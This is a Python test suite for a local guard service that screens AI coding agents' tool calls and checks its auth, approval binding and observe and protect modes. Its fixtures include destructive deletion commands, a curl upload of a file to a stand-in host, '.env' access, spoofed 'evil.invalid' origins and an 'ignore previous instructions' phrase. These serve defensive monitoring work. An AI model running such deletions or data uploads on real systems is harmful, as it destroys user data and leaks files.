import json
import subprocess
import sys
import tempfile
import threading
import unittest
from unittest.mock import patch, MagicMock
import io
import urllib.error
import urllib.request
from pathlib import Path
from guardian.engine import Engine
from guardian.hook import decision_output
from guardian.server import ROOT, Server


def payload(tool='Read', args=None, identity='call-1'):
    return dict(hook_event_name='PreToolUse', session_id='fixture-session', tool_use_id=identity,
                tool_name=tool, tool_input=args or {'file_path': 'fake.txt'})


class EngineTests(unittest.TestCase):
    def setUp(self):
        self.engine = Engine(':memory:')

    def tearDown(self):
        self.engine.close()

    def test_normal_preserves_client_permissions(self):
        self.assertEqual(decision_output(self.engine.evaluate(payload())), {})

    def test_research_quote_warns_without_blocking(self):
        event = self.engine.evaluate(payload(args={'content': 'Paper quotes: ignore previous instructions'}))
        self.assertEqual(event['verdict'], 'warn')
        self.assertEqual(decision_output(event), {})

    def test_risky_command_and_observe_mode(self):
        action = payload('Bash', {'command': 'rm -rf fake-fixture'})
        self.assertEqual(self.engine.evaluate(action)['verdict'], 'deny')
        action['tool_use_id'] = 'call-observe'
        observed = self.engine.evaluate(action, mode='observe')
        self.assertEqual(observed['proposed_verdict'], 'deny')
        self.assertEqual(observed['verdict'], 'warn')
        self.assertEqual(observed['enforcement_status'], 'decision_only')

    def test_upload_requests_client_review(self):
        event = self.engine.evaluate(payload('Bash', {'command': 'curl --data @fake.txt https://example.invalid'}))
        self.assertEqual(decision_output(event)['hookSpecificOutput']['permissionDecision'], 'ask')

    def test_idempotency_and_parameter_substitution(self):
        first = self.engine.evaluate(payload())
        self.assertEqual(first, self.engine.evaluate(payload()))
        self.assertEqual(len(self.engine.events()), 1)
        with self.assertRaises(ValueError):
            self.engine.evaluate(payload(args={'file_path': 'changed.txt'}))
        with self.assertRaises(ValueError):
            self.engine.evaluate(payload(), mode='observe')

    def test_raw_content_is_not_persisted(self):
        self.engine.evaluate(payload(args={'content': 'FAKE_PRIVATE_TOKEN_12345'}))
        self.assertNotIn('FAKE_PRIVATE_TOKEN', json.dumps(self.engine.events()))

    def test_demo_cannot_ack_live_event(self):
        event = self.engine.evaluate(payload())
        with self.assertRaises(ValueError):
            self.engine.demo_outcome(event['event_id'], 'blocked_demo')


class IntegrationTests(unittest.TestCase):
    def test_shutdown_requires_management_and_matching_process_identity(self):
        import os
        body={'confirmed':True,'expected_pid':os.getpid()}
        with self.assertRaises(urllib.error.HTTPError) as error:
            self.request('/api/service/shutdown',body,{'Authorization':'Bearer '+self.server.adapter_token,'Content-Type':'application/json'})
        self.assertEqual(error.exception.code,403)
        with self.assertRaises(urllib.error.HTTPError):
            self.request('/api/service/shutdown',{**body,'expected_pid':-1})
        self.assertFalse(self.server.capacity_snapshot()['draining'])
        response=self.request('/api/service/shutdown',body)
        self.assertTrue(response['stopping'])
        self.thread.join(2)
        self.assertFalse(self.thread.is_alive())
        self.assertTrue(self.server.capacity_snapshot()['draining'])

    def test_health_describes_service_without_claiming_client_verification(self):
        with patch.object(self.server,'integrations',side_effect=AssertionError('health must not scan clients')):
            health=self.request('/api/health')
        self.assertEqual(health['status'],'ready')
        self.assertEqual(health['health_scope'],'local_service_only')
        self.assertEqual(health['health_schema_version'],2)
        self.assertEqual(health['client_connected'],'unknown')
        self.assertEqual(health['verification'],'not_inferred_from_service_health')
        self.assertEqual(health['semantic_health'],'not_probed')
        self.assertNotIn('claude-2.1.220',json.dumps(health))
        with patch.object(self.engine,'storage_status',return_value={'status':'restart_required','write_failures':1}):
            self.assertEqual(self.request('/api/health')['status'],'degraded')

    def test_full_and_compact_catalog_share_mode_capabilities(self):
        full=self.request('/api/overview')
        compact=self.request('/api/overview/compact')
        self.assertEqual(full['adapter_catalog'],compact['adapter_catalog'])
        self.assertEqual({r['adapter'] for r in full['adapter_catalog'] if r['mode_control']},set(full['modes']))
        self.assertFalse(next(r for r in full['adapter_catalog'] if r['adapter']=='codex-mcp')['mode_control'])
        for row in full['adapter_catalog']:
            self.assertNotIn('online',row)
            self.assertNotIn('installed',row)

    def test_pi_route_uses_native_confirmation_and_preserves_call_binding(self):
        self.request('/api/policy',{'adapter':'pi-extension','mode':'protect'})
        action=payload('bash',{'command':'curl --data @fixture.txt https://example.invalid'})
        event=self.request('/api/pi/check',{'mode':'observe','payload':action})
        self.assertEqual(event['verdict'],'review')
        self.assertEqual(event['source_adapter'],'pi-extension')
        self.assertEqual(event['decision_state'],'awaiting_client_confirmation')
        self.assertIsNone(event['approval_status'])
        with self.assertRaises(urllib.error.HTTPError):
            self.request('/api/pi/check',{'payload':{**action,'tool_input':{'command':'different'}}})
        audit=self.request('/api/native-confirmation',{'adapter':'pi-extension','session_id':action['session_id'],
            'call_id':action['tool_use_id'],'event_id':event['event_id'],'binding':event['review_binding'],'outcome':'not_confirmed'})
        self.assertEqual(audit['native_confirmation']['outcome'],'not_confirmed')
        self.assertEqual(audit['execution_state'],'unknown')
        result=self.request('/api/receipt',{'adapter':'pi-extension','session_id':action['session_id'],
                                         'call_id':action['tool_use_id'],'status':'blocked'})
        self.assertEqual(result['event_id'],event['event_id'])
        self.assertEqual(result['execution_state'],'blocked')
        denied=self.request('/api/pi/check',{'payload':payload('powershell',{'command':'Remove-Item -Recurse -Force fixture'},'ps')})
        self.assertEqual(denied['verdict'],'deny')

    def setUp(self):
        self.engine = Engine(':memory:')
        self.server = Server(('127.0.0.1', 0), self.engine, 'fixture-token')
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        self.opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))

    def tearDown(self):
        self.server.shutdown()
        self.server.server_close()
        self.thread.join()
        self.engine.close()

    def request(self, path, data=None, headers=None):
        request = urllib.request.Request(self.server.origin+path,
            json.dumps(data).encode() if data is not None else None,
            headers or {'Authorization': 'Bearer fixture-token', 'Content-Type': 'application/json'})
        with self.opener.open(request, timeout=5) as response:
            return json.load(response)

    def test_model_demo_respects_shared_slot_without_inference(self):
        self.assertTrue(self.server.model_slot.acquire(blocking=False))
        try:
            with patch('guardian.server.urllib.request.build_opener') as transport:
                with self.assertRaises(urllib.error.HTTPError) as error:
                    self.request('/api/ollama/demo',{'model':'qwen3:8b'})
                self.assertEqual(error.exception.code,503)
                self.assertEqual(json.loads(error.exception.read())['code'],'local_model_busy')
                transport.assert_not_called()
        finally:self.server.model_slot.release()

    def test_compact_overview_preserves_action_state_and_requires_management_auth(self):
        event=self.engine.evaluate(payload('Read',{'file_path':'fixture/.env'}),adapter='codex-hook')
        self.engine.set_review(event['event_id'],{'status':'completed','evidence':[{'quote':'fixture '*100}]})
        full=self.request('/api/overview');compact=self.request('/api/overview/compact')
        self.assertEqual(len(compact['events']),len(full['events']))
        for short,complete in zip(compact['events'],full['events']):
            for key in ('event_id','session_id','verdict','findings','execution_state','approval_status','decision_state','mode'):
                self.assertEqual(short.get(key),complete.get(key))
            self.assertEqual(short['rule_coverage']['level'],complete['rule_coverage']['level'])
            self.assertEqual(short['explanations'][0]['title'],complete['explanations'][0]['title'])
            for key in ('model_review','action_preview','arguments_digest','review_binding'):self.assertNotIn(key,short)
        self.assertIn('model_review',self.engine.events()[0])
        for key in ('sessions','diagnostics','storage','presentation','modes','event_window','service_started_at'):
            self.assertEqual(compact[key],full[key])
        for key in ('rulebook','integrations','semantic_gate'):self.assertNotIn(key,compact)
        self.assertLess(len(json.dumps(compact)),len(json.dumps(full)))
        with self.assertRaises(urllib.error.HTTPError) as unauthorized:
            self.request('/api/overview/compact',headers={'Authorization':'Bearer '+self.server.adapter_token})
        self.assertEqual(unauthorized.exception.code,401)
        with patch.object(self.engine,'storage_status',return_value={'status':'restart_required'}):
            with self.assertRaises(urllib.error.HTTPError) as failed:self.request('/api/overview/compact')
            self.assertEqual(failed.exception.code,503)

    def test_patch_targets_through_codex_and_opencode_routes(self):
        text='*** Begin Patch\n*** Update File: .env\n@@\n-old\n+new\n*** End Patch'
        for route,adapter,key in (('/api/codex/check','codex-hook','command'),('/api/opencode/check','opencode-plugin','patchText')):
            self.request('/api/policy',{'adapter':adapter,'mode':'protect'})
            event=self.request(route,{'payload':payload('apply_patch',{key:text},adapter+'-patch')})
            self.assertEqual(event['verdict'],'review')
            self.assertIn('sensitive_file_access',event['findings'])
            self.assertEqual(event['action_preview']['targets'],['.env'])
            self.assertNotIn('+new',json.dumps(event))

    def test_codex_argv_boundaries_and_tool_names_cannot_reuse_http_approval(self):
        self.request('/api/policy',{'adapter':'codex-hook','mode':'protect'})
        original=['curl','--data','@first file.txt','https://example.invalid']
        changed=['curl','--data','@first','file.txt https://example.invalid']
        def check(tool,command,call):
            return self.request('/api/codex/check',{'payload':payload(tool,{'command':command},call)})
        first=check('shell',original,'first')
        self.assertEqual(first['tool_name'],'shell')
        self.request('/api/approvals',{'event_id':first['event_id'],'decision':'approve'})
        for tool,command,call in [('shell',changed,'changed'),('exec_command',original,'renamed'),('shell',' '.join(original),'string')]:
            self.assertEqual(check(tool,command,call)['verdict'],'review')
        retry=check('shell',original,'retry')
        self.assertEqual(retry['approved_from'],first['event_id'])
        self.assertEqual(retry['verdict'],'pass')
        self.assertEqual(check('shell',original,'again')['verdict'],'review')

    def test_semantic_gate_admin_only_and_shared_by_all_native_routes(self):
        from test_semantic_gate import CONFIG
        ingest={'Authorization':'Bearer '+self.server.adapter_token,'Content-Type':'application/json'}
        with self.assertRaises(urllib.error.HTTPError) as rejected:
            self.request('/api/semantic/config',CONFIG,ingest)
        self.assertEqual(rejected.exception.code,403)
        self.assertFalse(self.server.semantic.snapshot()['enabled'])
        self.request('/api/semantic/config',CONFIG)
        with self.assertRaises(urllib.error.HTTPError):self.request('/api/semantic/prepare',{'confirmed':True},ingest)
        with patch('guardian.semantic_gate.analyze',return_value={'status':'completed'}):
            self.request('/api/semantic/prepare',{'confirmed':True})
            self.server.semantic.worker.join(2)
        with patch('guardian.semantic_gate.analyze',return_value={'status':'timeout'}) as model:
            for route,adapter in (('/api/check','claude-hook'),('/api/opencode/check','opencode-plugin'),
                                  ('/api/gemini/check','gemini-hook'),('/api/codex/check','codex-hook')):
                self.request('/api/policy',{'adapter':adapter,'mode':'protect'})
                result=self.request(route,{'payload':payload('Bash',{'command':'python fixture.py'},adapter)},ingest)
                self.assertEqual(result['verdict'],'review')
                self.assertEqual(result['semantic_check']['status'],'timeout')
            self.assertEqual(model.call_count,4)
        self.assertEqual(self.request('/api/health')['semantic'],'experimental_scoped_pretool')
        with patch('guardian.semantic_gate.analyze',return_value={'status':'completed','assessment':'no_additional_signal','categories':[]}):
            for route,adapter in (('/api/check','claude-hook'),('/api/opencode/check','opencode-plugin'),
                                  ('/api/gemini/check','gemini-hook'),('/api/codex/check','codex-hook')):
                result=self.request(route,{'payload':payload('Bash',{'command':'python fixture.py'},adapter+'-no-signal')},ingest)
                self.assertEqual(result['verdict'],'review')
                self.assertEqual(result['semantic_check']['review_reason'],'missing_task_authorization')
        self.request('/api/semantic/config',{'enabled':False})
        self.assertEqual(self.request('/api/health')['semantic'],'not_in_pretool_path')

    def test_onboarding_http_auth_and_fixture_confirmation(self):
        import tempfile
        from pathlib import Path
        from guardian.onboarding import Onboarding
        with tempfile.TemporaryDirectory() as home:
            self.server.onboarding=Onboarding(home)
            for route in ('plan','apply'):
                with self.assertRaises(urllib.error.HTTPError) as error:
                    self.request('/api/onboarding/'+route,{},headers={'Authorization':'Bearer wrong'})
                self.assertEqual(error.exception.code,403)
            plan=self.request('/api/onboarding/plan',{'clients':['codex']})
            self.assertEqual(list(Path(home).iterdir()),[])
            with self.assertRaises(urllib.error.HTTPError):
                self.request('/api/onboarding/apply',{'plan_id':plan['plan_id'],'confirmed':False})
            with patch('guardian.server.integration_snapshot',return_value=[]):
                result=self.request('/api/onboarding/apply',{'plan_id':plan['plan_id'],'confirmed':True})
            self.assertFalse(result['execution_verified'])
            self.assertTrue((Path(home)/'.codex/hooks.json').exists())

    def test_presentation_is_management_only_and_does_not_change_protection(self):
        event=self.engine.evaluate(payload())
        before=self.engine.events();modes=self.server.policy.snapshot()
        with self.assertRaises(urllib.error.HTTPError) as error:
            self.request('/api/presentation',{'privacy_mode':True},{'Authorization':'Bearer '+self.server.adapter_token,'Content-Type':'application/json'})
        self.assertEqual(error.exception.code,403)
        result=self.request('/api/presentation',{'privacy_mode':True})
        self.assertTrue(result['privacy_mode'])
        self.assertTrue(self.request('/api/overview')['presentation']['privacy_mode'])
        self.assertEqual(before,self.engine.events());self.assertEqual(modes,self.server.policy.snapshot())
        self.request('/api/presentation',{'privacy_mode':False})
        self.assertFalse(self.request('/api/overview')['presentation']['privacy_mode'])

    def test_investigation_is_management_only_and_read_only(self):
        event=self.engine.evaluate(payload())
        body={'event_id':event['event_id']}
        with self.assertRaises(urllib.error.HTTPError) as error:
            self.request('/api/investigations/context',body,{'Authorization':'Bearer '+self.server.adapter_token,'Content-Type':'application/json'})
        self.assertEqual(error.exception.code,403)
        before=self.engine.events()
        result=self.request('/api/investigations/context',body)
        self.assertTrue(result['read_only']);self.assertEqual(result['anchor_event_id'],event['event_id'])
        self.assertEqual(before,self.engine.events())

    def test_history_management_is_not_available_to_adapter(self):
        self.engine.evaluate(payload())
        headers={'Authorization':'Bearer '+self.server.adapter_token,'Content-Type':'application/json'}
        for route,data in (('/api/history/export',None),('/api/history/preview-clear',{}),('/api/history/clear',{'confirmed':True})):
            with self.assertRaises(urllib.error.HTTPError):self.request(route,data,headers)
        self.assertEqual(self.request('/api/history/export')['count'],1)
        plan=self.request('/api/history/preview-clear',{})
        result=self.request('/api/history/clear',{'plan_id':plan['plan_id'],'confirmed':True})
        self.assertEqual(result['deleted'],1)
        self.assertEqual(self.engine.events(),[])

    def test_feedback_requires_management_and_never_approves(self):
        event=self.engine.evaluate(payload('Bash',{'command':'rm -rf fixture'}))
        data={'event_id':event['event_id'],'label':'false_positive','revision':0}
        with self.assertRaises(urllib.error.HTTPError):
            self.request('/api/feedback',data,{'Authorization':'Bearer '+self.server.adapter_token,'Content-Type':'application/json'})
        saved=self.request('/api/feedback',data)
        self.assertEqual(saved['verdict'],'deny')
        self.assertEqual(saved['user_feedback']['label'],'false_positive')
        self.assertEqual(self.engine.db.execute('SELECT COUNT(*) FROM approvals').fetchone()[0],0)

    def test_storage_failure_returns_no_decision_and_preserves_mode(self):
        import sqlite3
        from test_storage_failures import FaultConnection
        self.engine.db=FaultConnection(self.engine.db)
        with self.assertRaises(urllib.error.HTTPError) as error:self.request('/api/check',{'payload':payload()})
        self.assertEqual(error.exception.code,503)
        self.assertEqual(self.engine.events(),[])
        self.assertEqual(self.request('/api/health')['storage']['status'],'write_failed')
        self.assertEqual(self.request('/api/health')['status'],'degraded')
        previous=self.server.policy.snapshot()
        self.engine.db.fail_commit=True
        with self.assertRaises(urllib.error.HTTPError):self.request('/api/policy',{'adapter':'claude-hook','mode':'protect'})
        self.assertEqual(self.server.policy.snapshot(),previous)
        event=self.request('/api/check',{'payload':payload()})
        self.assertEqual(event['verdict'],'pass')
        self.assertEqual(self.request('/api/health')['storage']['status'],'ready')
        self.assertEqual(self.request('/api/health')['status'],'ready')

    def test_semantic_change_revokes_pending_requests_but_invalid_config_does_not(self):
        event=self.engine.evaluate(payload('Bash',{'command':'curl -d @fixture.txt https://example.invalid'}),adapter='opencode-plugin')
        with self.assertRaises(urllib.error.HTTPError):self.request('/api/semantic/config',{'enabled':True})
        self.assertEqual(self.engine.get_event(event['event_id'])['approval_status'],'pending')
        self.request('/api/semantic/config',{'enabled':False})
        self.assertEqual(self.engine.get_event(event['event_id'])['approval_revocation_reason'],'semantic_changed')
        with self.assertRaises(urllib.error.HTTPError):self.request('/api/approvals',{'event_id':event['event_id'],'decision':'approve'})

    def test_storage_failure_prevents_semantic_config_change(self):
        from test_storage_failures import FaultConnection
        revision=self.server.semantic.revision
        self.engine.db=FaultConnection(self.engine.db)
        with self.assertRaises(urllib.error.HTTPError) as error:self.request('/api/semantic/config',{'enabled':False})
        self.assertEqual(error.exception.code,503)
        self.assertEqual(self.server.semantic.revision,revision)

    def test_new_service_invalidates_old_pending_requests(self):
        engine=Engine(':memory:')
        try:
            event=engine.evaluate(payload('Bash',{'command':'curl -d @fixture.txt https://example.invalid'}),adapter='opencode-plugin')
            server=Server(('127.0.0.1',0),engine,'fixture-restart-token')
            try:
                saved=engine.get_event(event['event_id'])
                self.assertEqual(saved['approval_status'],'revoked')
                self.assertEqual(saved['approval_revocation_reason'],'service_restarted')
                with self.assertRaises(ValueError):engine.approve(event['event_id'],'approve')
            finally:server.server_close()
        finally:engine.close()

    def test_opencode_navigation_targets_only_reporting_instance(self):
        import uuid
        instance=str(uuid.uuid4())
        headers={'Authorization':'Bearer '+self.server.adapter_token,'Content-Type':'application/json'}
        heartbeat={'instance_id':instance,'adapter':'opencode-plugin','mode':'observe','project_id':'a'*16,'navigation':'session_select'}
        self.request('/api/opencode/heartbeat',heartbeat,headers)
        event=self.request('/api/opencode/check',{'instance_id':instance,'payload':{**payload(),'session_id':'ses_fixture1234'}},headers)
        with self.assertRaises(urllib.error.HTTPError):self.request('/api/source/open',{'event_id':event['event_id']},headers)
        result=self.request('/api/source/open',{'event_id':event['event_id']})
        self.assertEqual(result['state'],'queued')
        instruction=self.request('/api/opencode/heartbeat',heartbeat,headers)['navigation']
        self.assertEqual(instruction['session_id'],'ses_fixture1234')
        self.request('/api/opencode/navigation-result',{'instance_id':instance,'request_id':instruction['request_id'],'status':'dispatched'},headers)
        self.assertEqual(self.server.navigation.status(event['event_id'])['state'],'dispatched')
        self.assertNotIn('ses_fixture1234',json.dumps(self.engine.events()))

    def test_source_focus_permission_exposes_only_authenticated_backend_pid(self):
        import os
        result=self.request('/api/source/prepare',{})
        self.assertEqual(result,{'foreground_process_id':os.getpid()})
        headers={'Authorization':'Bearer '+self.server.adapter_token,'Content-Type':'application/json'}
        with self.assertRaises(urllib.error.HTTPError):self.request('/api/source/prepare',{},headers)

    def test_adapter_credential_cannot_read_history_or_manage_approvals(self):
        self.server.adapter_token='fixture-ingest-only'
        headers={'Authorization':'Bearer fixture-ingest-only','Content-Type':'application/json'}
        self.assertEqual(self.request('/api/health',headers=headers)['rules'],'ready')
        event=self.request('/api/check',{'payload':payload('Read',{'file_path':'fixture.txt'})},headers=headers)
        self.assertEqual(event['verdict'],'pass')
        for route in ('/api/overview','/api/events','/api/discovery','/api/connections','/api/integrations','/api/models/local'):
            with self.subTest(route=route),self.assertRaises(urllib.error.HTTPError) as error:
                self.request(route,headers=headers)
            self.assertEqual(error.exception.code,401)
        for route in ('/api/approvals','/api/policy','/api/onboarding/plan','/api/onboarding/apply',
                      '/api/launch-ticket','/api/desktop/open','/api/demo','/api/ollama/demo','/api/reviews/local','/api/reviews/cancel','/api/source/open'):
            with self.subTest(route=route),self.assertRaises(urllib.error.HTTPError) as error:
                self.request(route,{},headers=headers)
            self.assertEqual(error.exception.code,403)
        ticket=self.request('/api/launch-ticket',{})['ticket']
        connected=self.request('/api/connect',{'ticket':ticket},headers={'Content-Type':'application/json'})
        self.assertEqual(connected['token'],'fixture-token')
        with self.assertRaises(urllib.error.HTTPError):
            self.request('/api/connect',{'ticket':ticket},headers={'Content-Type':'application/json'})

    def test_distinct_management_and_adapter_credentials_required(self):
        with self.assertRaises(ValueError):
            Server(('127.0.0.1',0),self.engine,'same',adapter_token='same')

    def test_model_review_route_requires_consent_and_does_not_wait_for_inference(self):
        event=self.engine.evaluate(payload('Read',{'file_path':'fixture.txt'}))
        body={'event_id':event['event_id'],'port':11434,'model':'fixture:local'}
        with self.assertRaises(urllib.error.HTTPError):self.request('/api/reviews/local',body)
        with patch.object(self.server.reviewer,'submit',return_value={'queued':True}) as submit:
            result=self.request('/api/reviews/local',{**body,'confirmed':True})
            self.assertTrue(result['queued'])
            submit.assert_called_once_with(event['event_id'],11434,'fixture:local',True,'auto',False,'',False)
            submit.reset_mock()
            self.request('/api/reviews/local',{**body,'confirmed':True,'include_context':True})
            submit.assert_called_once_with(event['event_id'],11434,'fixture:local',True,'auto',True,'',False)

    def test_demo_protect_stops_side_effect_observe_does_not(self):
        protected = self.request('/api/demo', {'mode': 'protect'})
        observed = self.request('/api/demo', {'mode': 'observe'})
        self.assertEqual(protected['simulated_upload_count'], 0)
        self.assertEqual(observed['simulated_upload_count'], 1)
        self.assertTrue(all(e['is_demo'] for e in self.request('/api/events')))

    def test_overview_auth_and_config_cache(self):
        with patch('guardian.server.integration_snapshot',return_value=[]) as read:
            with self.assertRaises(urllib.error.HTTPError):
                self.request('/api/overview',headers={'Authorization':'Bearer wrong'})
            self.assertEqual(read.call_count,0)
            self.assertEqual(self.request('/api/overview')['event_window'],200)
            self.request('/api/overview')
            self.assertEqual(read.call_count,1)
            self.server.integrations(force=True)
            self.assertEqual(read.call_count,2)

    def test_live_mode_overrides_client_default_and_receipts(self):
        self.request('/api/policy',{'adapter':'claude-hook','mode':'protect'})
        event=self.request('/api/check',{'mode':'observe','payload':payload('Bash',{'command':'rm -fr fixture'})})
        self.assertEqual(event['verdict'],'deny')
        self.assertEqual(event['mode'],'protect')
        self.request('/api/policy',{'adapter':'claude-hook','mode':'observe'})
        event=self.request('/api/check',{'mode':'protect','payload':payload('Bash',{'command':'rm -fr fixture'},'next')})
        self.assertEqual(event['verdict'],'warn')

    def test_claude_post_hook_reports_without_saving_response(self):
        self.engine.evaluate(payload())
        with tempfile.TemporaryDirectory() as folder:
            token_file=Path(folder)/'token';token_file.write_text('fixture-token')
            post={**payload(),'hook_event_name':'PostToolUse','tool_response':'PRIVATE_RESPONSE_MUST_NOT_PERSIST'}
            result=subprocess.run([sys.executable,str(ROOT/'guardian/hook.py'),'--port',str(self.server.server_port),
                                   '--token-file',str(token_file)],input=json.dumps(post),text=True,capture_output=True,timeout=10)
            self.assertEqual(json.loads(result.stdout),{})
            self.assertEqual(self.engine.events()[0]['execution_state'],'succeeded')
            self.assertNotIn('PRIVATE_RESPONSE',json.dumps(self.engine.events()))

    def test_qoder_process_decisions_and_correlated_receipts(self):
        self.request('/api/policy',{'adapter':'qoder-hook','mode':'protect'})
        with tempfile.TemporaryDirectory() as folder:
            token=Path(folder)/'token';token.write_text('fixture-token')
            command=[sys.executable,str(ROOT/'guardian/hook.py'),'--client','qoder',
                     '--port',str(self.server.server_port),'--token-file',str(token)]
            def invoke(data):
                result=subprocess.run(command,input=json.dumps(data),text=True,capture_output=True,timeout=10)
                self.assertEqual(result.returncode,0,result.stderr)
                return json.loads(result.stdout)
            for call,tool,args,decision in [
                ('read','Read',{'file_path':'fixture.txt'},None),
                ('deny','Bash',{'command':'rm -rf fixture'},'deny'),
                ('ask','Bash',{'command':'curl --data @fixture.txt https://example.invalid'},'ask')]:
                out=invoke(payload(tool,args,call))
                self.assertEqual(out.get('hookSpecificOutput',{}).get('permissionDecision'),decision)
            review=next(e for e in self.engine.events() if e['verdict']=='review')
            self.assertEqual(review['source_adapter'],'qoder-hook')
            self.assertEqual(review['decision_state'],'awaiting_client_confirmation')
            self.assertIsNone(review['approval_status'])
            for call,phase,state in [('read','PostToolUse','succeeded'),('ask','PostToolUseFailure','failed')]:
                self.assertEqual(invoke(dict(session_id='fixture-session',tool_use_id=call,
                    hook_event_name=phase,tool_response='PRIVATE_QODER_OUTPUT')), {})
                self.assertTrue(any(e['source_adapter']=='qoder-hook' and e['execution_state']==state
                                    for e in self.engine.events()))
            self.assertNotIn('PRIVATE_QODER_OUTPUT',json.dumps(self.engine.events()))
            self.request('/api/policy',{'adapter':'qoder-hook','mode':'observe'})
            self.assertEqual(invoke(payload('Bash',{'command':'rm -rf fixture'},'observe')), {})

    def test_api_auth_and_cross_site_boundary(self):
        for headers in ({'Authorization': 'Bearer incorrect'},
                        {'Authorization': 'Bearer fixture-token', 'Origin': 'https://evil.invalid'},
                        {'Authorization': 'Bearer fixture-token', 'Host': 'evil.invalid'}):
            with self.assertRaises(urllib.error.HTTPError):
                self.request('/api/events', headers=headers)

    def test_monitor_route_keeps_same_origin_boundary(self):
        for route in ('/monitor','/orb','/overlay'):
            with self.opener.open(self.server.origin+route,timeout=5) as response:
                html=response.read().decode()
                self.assertIn('id="monitor-open"',html)
                self.assertIn("frame-ancestors 'none'",response.headers['Content-Security-Policy'])
        request=urllib.request.Request(self.server.origin+'/monitor',headers={'Host':'evil.invalid'})
        with self.assertRaises(urllib.error.HTTPError):self.opener.open(request,timeout=5)

    def test_launch_ticket_single_use_and_expiry(self):
        ticket=self.request('/api/launch-ticket',{})['ticket']
        headers={'Content-Type':'application/json'}
        result=self.request('/api/connect',{'ticket':ticket},headers)
        self.assertEqual(result['token'],'fixture-token')
        with self.assertRaises(urllib.error.HTTPError):self.request('/api/connect',{'ticket':ticket},headers)
        ticket=self.request('/api/launch-ticket',{})['ticket']
        self.server.tickets[ticket]=0
        with self.assertRaises(urllib.error.HTTPError):self.request('/api/connect',{'ticket':ticket},headers)
        with self.assertRaises(urllib.error.HTTPError):self.request('/api/launch-ticket',{},headers)

    def test_real_hook_process_protocol(self):
        with tempfile.TemporaryDirectory(prefix='guardian 中文 ') as folder:
            token_file = Path(folder) / 'token file'
            token_file.write_text('fixture-token')
            for tool, args, expected in [('Read', {'file_path': 'fake.txt'}, None),
                                         ('Bash', {'command': 'rm -rf fake-fixture'}, 'deny')]:
                result = subprocess.run([sys.executable, str(ROOT/'guardian'/'hook.py'), '--port',
                    str(self.server.server_port), '--token-file', str(token_file), '--mode', 'protect'],
                    input=json.dumps(payload(tool, args, tool)), text=True, capture_output=True, timeout=10)
                self.assertEqual(result.returncode, 0)
                decision = json.loads(result.stdout).get('hookSpecificOutput', {}).get('permissionDecision')
                self.assertEqual(decision, expected)

    def test_hook_failure_modes(self):
        for mode in ['protect', 'observe']:
            result = subprocess.run([sys.executable, str(ROOT/'guardian'/'hook.py'), '--token-file',
                'nonexistent-fixture-token', '--mode', mode], input=json.dumps(payload()), text=True,
                capture_output=True, timeout=10)
            output = json.loads(result.stdout)
            if mode == 'protect':
                self.assertEqual(output['hookSpecificOutput']['permissionDecision'], 'deny')
            else:
                self.assertNotIn('hookSpecificOutput', output)

    def test_live_hook_defaults_to_observation_for_claude_and_gemini(self):
        with tempfile.TemporaryDirectory() as folder:
            token=Path(folder)/'token';token.write_text('fixture-token')
            for client,tool,event in [('claude','Bash','PreToolUse'),('gemini','run_shell_command','BeforeTool')]:
                action=payload(tool,{'command':'rm -rf fake-fixture'})
                action['hook_event_name']=event
                result=subprocess.run([sys.executable,str(ROOT/'guardian/hook.py'),'--client',client,
                    '--port',str(self.server.server_port),'--token-file',str(token)],
                    input=json.dumps(action),capture_output=True,text=True,timeout=10)
                self.assertEqual(result.returncode,0,result.stderr)
                output=json.loads(result.stdout)
                self.assertNotIn('decision',output)
                self.assertNotIn('hookSpecificOutput',output)
                latest=self.engine.events()[0]
                self.assertEqual(latest['mode'],'observe')

    def test_opencode_plugin_real_http(self):
        import os
        with tempfile.TemporaryDirectory() as folder:
            token_file = Path(folder)/'token'
            token_file.write_text('fixture-token')
            result = subprocess.run(['node',str(ROOT/'tests/opencode-contract.mjs')],
                env={**os.environ,'GUARDIAN_PORT':str(self.server.server_port),'GUARDIAN_TOKEN_FILE':str(token_file)},
                text=True,capture_output=True,timeout=15)
            self.assertEqual(result.returncode,0,result.stderr)
            self.assertTrue(all(e['adapter_id']=='opencode-plugin' for e in self.engine.events()))

    def test_readonly_discovery_and_config_write_lock(self):
        report=self.request('/api/discovery')
        self.assertTrue(report['read_only'])
        self.assertFalse(report['external_config_writes'])
        with self.assertRaises(urllib.error.HTTPError) as denied:
            self.request('/api/integrations',{'client':'codex','action':'install'})
        self.assertEqual(denied.exception.code,403)

    def test_codex_hook_process_isolated_no_client_configuration(self):
        self.server.policy.set('codex-hook','protect')
        with tempfile.TemporaryDirectory() as folder:
            token_file=Path(folder)/'token'
            token_file.write_text('fixture-token')
            action=payload('Bash',{'command':'rm -rf fake-fixture'})
            action['session_id']='12345678-1234-4234-8234-123456789abc'
            with patch.object(self.server.origins.windows,'capture',return_value=None) as capture:
                result=subprocess.run([sys.executable,str(ROOT/'guardian/codex_hook.py'),'--port',str(self.server.server_port),
                    '--token-file',str(token_file)],input=json.dumps(action),capture_output=True,text=True,timeout=10,cwd=folder)
                capture.assert_called_once()
                self.assertIs(type(capture.call_args.args[0]),int)
                self.assertGreater(capture.call_args.args[0],0)
            self.assertEqual(result.returncode,0,result.stderr)
            self.assertEqual(json.loads(result.stdout)['hookSpecificOutput']['permissionDecision'],'deny')
            self.assertEqual(self.engine.events()[0]['source_adapter'],'codex-hook')

    def test_gemini_hook_process(self):
        with tempfile.TemporaryDirectory() as folder:
            token_file = Path(folder)/'token'
            token_file.write_text('fixture-token')
            action = payload('run_shell_command',{'command':'rm -rf fake-fixture'})
            action['hook_event_name']='BeforeTool'
            result = subprocess.run([sys.executable,str(ROOT/'guardian/hook.py'),'--client','gemini',
                '--port',str(self.server.server_port),'--token-file',str(token_file),'--mode','protect'],input=json.dumps(action),
                capture_output=True,text=True,timeout=10)
            self.assertEqual(json.loads(result.stdout)['decision'],'deny')
            self.assertEqual(self.engine.events()[0]['adapter_id'],'gemini-hook')

    def test_mcp_demo_process(self):
        with tempfile.TemporaryDirectory() as folder:
            token_file = Path(folder)/'token'
            token_file.write_text('fixture-token')
            messages = [{'jsonrpc':'2.0','id':1,'method':'initialize','params':{}},
                        {'jsonrpc':'2.0','id':2,'method':'tools/call','params':{'name':'guardian_upload_demo','arguments':{}}}]
            result = subprocess.run([sys.executable,str(ROOT/'guardian/mcp_demo.py'),'--port',str(self.server.server_port),
                '--token-file',str(token_file)],input='\n'.join(json.dumps(x) for x in messages)+'\n',
                capture_output=True,text=True,timeout=10)
            rows=[json.loads(line) for line in result.stdout.splitlines()]
